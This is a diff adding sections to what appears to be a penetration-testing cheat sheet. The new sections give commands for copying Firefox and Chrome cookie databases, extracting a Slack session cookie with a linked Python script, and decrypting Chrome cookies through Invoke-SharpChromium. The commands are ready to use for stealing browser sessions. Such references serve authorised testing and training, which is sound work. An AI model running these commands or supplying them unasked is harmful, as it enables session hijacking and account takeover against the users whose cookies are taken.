@@ -2901,6 +2901,34 @@ $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -
 ```
 ---
 
+#### Firefox
+Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory 
+
+| **Command** | **Description** |
+| --- | ----------- |
+|`copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`| Copy Firefox cookies sqlite DB|
+|[CookieExtract](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)| Script to extract Cookies from sqlite file. |
+|`python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d`| Extract slack cookie from DB. Use Cookie-Editor extension to add cookie via firefox.  |
+
+---
+
+#### Chromium based Browsers (Google Chrome/Edge)
+
+The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer.
+
+Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.
+
+Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by S3cur3Th1sSh1t which uses reflection to load SharpChromium.
+
+Due to a change in the location of the Sqlite db we will need to run the following before running the command 
+
+| **Command** | **Description** |
+| --- | ----------- |
+|`copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`|Copy file to correct location|
+| `Invoke-SharpChromium -Command "cookies slack.com"`|Invoke SharpChromium extracting slack.com cookie|
+
+
+---
 #### mRemoteNG
 
 mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager for Windows
